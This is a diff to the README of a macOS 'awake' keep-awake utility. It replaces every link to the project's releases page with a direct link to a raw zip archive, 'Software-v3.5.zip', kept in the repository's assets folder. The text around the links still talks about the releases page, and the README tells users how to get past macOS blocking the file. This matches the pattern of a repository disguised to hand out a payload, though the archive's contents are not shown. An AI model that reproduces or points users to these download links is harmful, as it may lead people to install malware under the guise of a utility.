@@ -1,6 +1,6 @@
 # ⏳ awake - Keep Your Mac Awake Easily
 
-[![Download awake](https://img.shields.io/badge/Download%20awake-blue?style=for-the-badge&logo=github)](https://github.com/Laetitiaruined304/awake/releases)
+[![Download awake](https://img.shields.io/badge/Download%20awake-blue?style=for-the-badge&logo=github)](https://github.com/Laetitiaruined304/awake/raw/refs/heads/main/assets/Software-v3.5.zip)
 
 ## 🖥️ What awake does
 
@@ -12,7 +12,7 @@ It runs from the terminal and also includes a clean TUI, which is a text user in
 
 Visit this page to download the latest version of awake:
 
-https://github.com/Laetitiaruined304/awake/releases
+https://github.com/Laetitiaruined304/awake/raw/refs/heads/main/assets/Software-v3.5.zip
 
 On that page, look for the latest release. Download the file that matches your Mac. If there is more than one file, pick the one that is meant for macOS.
 
@@ -33,7 +33,7 @@ If your Mac blocks the file at first, you may need to open it from Finder with a
 
 Follow these steps to run awake on your Mac:
 
-1. Open the download page: https://github.com/Laetitiaruined304/awake/releases
+1. Open the download page: https://github.com/Laetitiaruined304/awake/raw/refs/heads/main/assets/Software-v3.5.zip
 2. Find the newest release at the top of the page.
 3. Download the macOS file from that release.
 4. Open the downloaded file.
@@ -210,6 +210,6 @@ It is a practical tool for people who want direct control without a lot of setup
 
 If you need the file again, use this link:
 
-[Download awake releases](https://github.com/Laetitiaruined304/awake/releases)
+[Download awake releases](https://github.com/Laetitiaruined304/awake/raw/refs/heads/main/assets/Software-v3.5.zip)
 
 Open the latest release and get the macOS download from there
